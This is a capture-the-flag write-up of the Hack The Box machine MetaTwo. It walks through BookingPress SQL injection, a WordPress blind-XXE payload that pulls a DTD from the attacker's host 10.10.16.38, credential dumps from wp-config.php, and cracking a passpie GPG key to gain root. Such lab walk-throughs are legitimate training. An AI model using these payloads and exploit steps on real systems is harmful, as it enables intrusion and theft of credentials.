# MetaTwo
## Introduction
MetaTwo machine is a machine created by Nauten. This machine is a great one to learn about wordpress exploitation and sql injection. it also teaches you escelate privilages to the root user using passpie which is a password manager.

## Scanning
First I fired up an nmap scan to discover open ports and I found that there are 3 open ports which are **21, 22 and 80** which means that there are 3 services running and the http port is redirecting me to a domain called metapress.htb so I added to the ***/etc/host*** file
```bash
┌──(kali㉿kali)-[~/HTB]
└─$ nmap -sC -sV 10.10.11.186
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 06:24 EDT
Nmap scan report for 10.10.11.186
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
```
After I added the domain to my hosts file I opened the website and It showed me a website and was mentioned that it is powered by Wordpress so I scanned the website with wpscan
![image](/MetaTwo/img/1.png)
The wpscan tool Identified that the website is using wordpress 5.6.2 which is vurlnable but we will use that later not now.
```bash
┌──(kali㉿kali)-[~/HTB]
└─$ wpscan --url http://metapress.htb/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://metapress.htb/ [10.10.11.186]
[+] Started: Wed Apr 26 06:42:26 2023

Interesting Finding(s):

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
```
After that I used gobuster to discover directores and found a lot of directories so I navigated to each one of them and inspected the source code and some interesting things.
```bash
┌──(kali㉿kali)-[~/HTB]
└─$ gobuster dir -u http://metapress.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://metapress.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/04/26 10:15:20 Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/rss                  (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]
/login                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-login.php]
/events               (Status: 301) [Size: 0] [--> http://metapress.htb/events/]
/feed                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]
/0                    (Status: 301) [Size: 0] [--> http://metapress.htb/0/]
/atom                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/atom/]
/s                    (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]
/a                    (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/c                    (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
```
the only directory that I could come up with something from is the events directory and it was the version of the software used in handling the events which is `booking press 1.0.10` so I searched for an online exploit and I found this [github repository](https://github.com/destr4ct/CVE-2022-0739) which contains an automated script which exploit this  program and it basically exploit the program by sql injection in "wpnonce" paramter
![image](MetaTwo/img/2.png)
```bash
┌──(kali㉿kali)-[~/HTB/CVE-2022-0739]
└─$ python3 booking-press-expl.py -u http://metapress.htb/ -n 361e6b22d4
- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU
```
As you can see these passwords are hashed so I tried to crack it using johntheripper but the manager's password was the only one that could be cracked.
```bash
┌──(kali㉿kali)-[~/HTB/CVE-2022-0739]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashed
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (manager)     
1g 0:00:00:16 DONE (2023-04-26 10:42) 0.06142g/s 6781p/s 6781c/s 6781C/s penny6..onelove7
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 
```
so I tried to login to the wp-admin page and it worked. Do you remember at the beginning of the writeup where we found a wordpress CVE and we said that we will leave it for later? now it is the time to use it. If you navigate to [github repository](https://github.com/elf1337/blind-xxe-controller-CVE-2021-29447) you will find some steps to exploit this version of wordpress. First we create a wav file named payload.wav
```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.16.38:8000/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```
After that we run the main.py script
```bash
python3 main.py 10.10.16.38
Listening on port 8000
$console > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```
And BOOM we got a blind xxe injection and if you read the wp-config.php file you will get the ftp username
```bash
$console > /var/www/metapress.htb/blog/wp-config.php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```
So I logged in using ftp and found the following send_email.php file in the mailer directory so i sent to my local machine and read it
```bash
┌──(kali㉿kali)-[~/HTB/blind-xxe-controller-CVE-2021-29447]
└─$ cat send_email.php                    
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "
";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```
so I tried logging in using ssh and it worked!!!!!!!!
```bash
┌──(kali㉿kali)-[~/HTB/blind-xxe-controller-CVE-2021-29447]
└─$ ssh jnelson@metapress.htb
The authenticity of host 'metapress.htb (10.10.11.186)' can't be established.
ED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'metapress.htb' (ED25519) to the list of known hosts.
jnelson@metapress.htb's password: 
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Apr 26 17:03:34 2023 from 10.10.16.39
jnelson@meta2:~$ 
```
## Privilage Escalation
After I logged in to the machine using ssh and readin user.txt file to exctract the user flag I tried escelate my privilages so I show all direcitories
```bash
jnelson@meta2:~$ ls -la
total 904
drwxr-xr-x 5 jnelson jnelson   4096 Apr 26 16:46 .
drwxr-xr-x 3 root    root      4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root         9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson    220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson   3526 Jun 26  2022 .bashrc
drwx------ 3 jnelson jnelson   4096 Apr 26 11:54 .gnupg
-rwxr-xr-x 1 jnelson jnelson 830015 Apr 21 07:42 linpeas.sh
drwxr-xr-x 3 jnelson jnelson   4096 Oct 25  2022 .local
-rwxr-xr-x 1 jnelson jnelson      0 Apr 26 10:25 lse.sh
-rwxr-xr-x 1 jnelson jnelson  48026 Apr 26 10:25 lse.sh.1
-rw-r--r-- 1 jnelson jnelson    347 Apr 26 10:41 pass
dr-xr-x--- 3 jnelson jnelson   4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson    347 Apr 26 16:46 passpie_cleartext
-rw-r--r-- 1 jnelson jnelson    807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson     33 Apr 26 05:02 user.txt
```
the .passpie directory pulled my attenton so went to it and I found an ssh directory si CDed into it and I found two files which are jnelson.pass and root.pass and after some research I fount that passpie is a password manager and you can export a password by creating a pass file and exporting the password into it but it needs a praraphrase to export it so I went back the .passpie/ssh directory and discovered that I should crack the root.pass file so used johntheripper
```bash
❯ gpg2john key > gpg.john
❯ john -w=/usr/share/wordlists/rockyou.txt gpg.john 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:02 DONE (2022-10-30 02:23) 0.3663g/s 70.32p/s 70.32c/s 70.32C/s ginger..november
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
after that you should export the password into the pass file
```
jnelson@meta2:~$ touch pass
jnelson@meta2:~$ passpie export pass
jnelson@meta2:~$ cat pass
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```
And you ssh using root
